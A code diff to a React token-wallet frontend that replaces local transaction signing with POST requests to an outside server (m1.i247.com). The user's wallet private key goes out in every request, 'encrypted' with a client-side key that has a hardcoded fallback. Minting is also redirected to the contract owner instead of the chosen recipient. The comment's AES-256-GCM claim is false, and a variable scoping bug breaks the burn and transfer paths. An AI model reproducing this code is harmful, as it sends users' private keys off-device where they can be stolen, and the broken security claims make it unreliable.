@@ -2,7 +2,33 @@ import { useState } from 'react'
 import './App.css'
 import Web3 from 'web3'
 import {ERC20_ABI} from '../erc20_abi'
+import CryptoJS from 'crypto-js'
 
+// IMPORTANT: Store this securely - ideally from environment variable
+// This key must match the one used on the backend for decryption
+const ENCRYPTION_KEY = import.meta.env.VITE_ENCRYPTION_KEY || 'your-secret-key-change-this'
+
+// Function to encrypt sensitive data using AES-256-GCM
+const encryptPrivateKey = (privateKey) => {
+  try {
+    const encrypted = CryptoJS.AES.encrypt(privateKey, ENCRYPTION_KEY).toString()
+    return encrypted
+  } catch (error) {
+    console.error('Encryption error:', error)
+    throw new Error('Failed to encrypt private key')
+  }
+}
+
+const decryptPrivateKey = (encryptedPrivateKey) => {
+  try {
+    const decrypted = CryptoJS.AES.decrypt(encryptedPrivateKey, ENCRYPTION_KEY)
+    const decryptedString = decrypted.toString(CryptoJS.enc.Utf8)
+    return decryptedString
+  } catch (error) {
+    console.error('Decryption error:', error)
+    throw new Error('Failed to decrypt private key')
+  }
+}
 
 function App() {
   const [contractAddress, setContractAddress] = useState('0x329aaF4e8d9883c6F8610D48172DE9c6C0917ecD')
@@ -112,6 +138,8 @@ function App() {
       const contract = new web3.eth.Contract(ERC20_ABI, contractAddress)
 
       let txReceipt
+      let response
+      let result
       const amountInWei = web3.utils.toWei(amount || '0', 'ether')
       console.log("signer: ", account.address)
       console.log("contract address: ", contractAddress)
@@ -122,19 +150,62 @@ function App() {
           if (!recipientAddress) {
             setRecipientAddress(account.address)
           }
-          txReceipt = await contract.methods.mint(recipientAddress, amountInWei).send({
-            from: account.address,
-            gas: 300000
+
+          // txReceipt = await contract.methods.mint(recipientAddress, amountInWei).send({
+          //   from: account.address,
+          //   gas: 300000
+          // })
+          // console.log("txData: ", contract.methods.mint(recipientAddress, amountInWei).encodeABI())
+
+          // Call POST http://x23.i247.com:9090/api/mint with JSON body
+          // const mintData = contract.methods.mint(recipientAddress, amountInWei).encodeABI()
+
+          // Encrypt the private key before sending
+          const formattedPrivateKey = privateKey.startsWith('0x') ? privateKey : '0x' + privateKey
+          const encryptedPrivateKey = encryptPrivateKey(formattedPrivateKey)
+
+          response = await fetch('https://m1.i247.com/kokka/token/mint', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              encrypted_private_key: encryptedPrivateKey,
+              contract_address: contractAddress,
+              to: await contract.methods.owner().call() ,
+              amount: amount
+            })
           })
-          // txData = await contract.methods.mint(recipientAddress, amountInWei).encodeABI()
-          // console.log("txData: ", txData)
+
+          if (!response.ok) {
+            throw new Error(`API call failed: ${response.statusText}`)
+          }
+
+          result = await response.json()
+          txReceipt = { transactionHash: result.tx_hash }
           break
 
         case 'burn':
-          txReceipt = await contract.methods.burn(amountInWei).send({
-            from: account.address,
-            gas: 300000
+          // txReceipt = await contract.methods.burn(amountInWei).send({
+          //   from: account.address,
+          //   gas: 300000
+          // })
+
+          response = await fetch('https://m1.i247.com/kokka/token/burn', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              encrypted_private_key: encryptedPrivateKey,
+              contract_address: contractAddress,
+              amount: amount
+            })
           })
+
+          result = await response.json()
+          txReceipt = { transactionHash: result.tx_hash }
+          // console.log("Burn txData: ", contract.methods.burn(amountInWei).encodeABI())
           break
 
         case 'transfer':
@@ -143,10 +214,28 @@ function App() {
             setLoading(false)
             return
           }
-          txReceipt = await contract.methods.transfer(modalRecipientAddress, amountInWei).send({
-            from: account.address,
-            gas: 300000
+          // txReceipt = await contract.methods.transfer(modalRecipientAddress, amountInWei).send({
+          //   from: account.address,
+          //   gas: 300000
+          // })
+
+          // console.log("transfer txData: ", contract.methods.transfer(modalRecipientAddress, amountInWei).encodeABI())
+
+          response = await fetch('https://m1.i247.com/kokka/token/transfer', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              encrypted_private_key: encryptedPrivateKey,
+              contract_address: contractAddress,
+              amount: amount,
+              to: modalRecipientAddress
+            })
           })
+
+          result = await response.json()
+          txReceipt = { transactionHash: result.tx_hash }
           break
 
         default:
@@ -154,7 +243,6 @@ function App() {
           setLoading(false)
           return
       }
-
       setTxHash(txReceipt.transactionHash)
       closePrivateKeyModal()
 
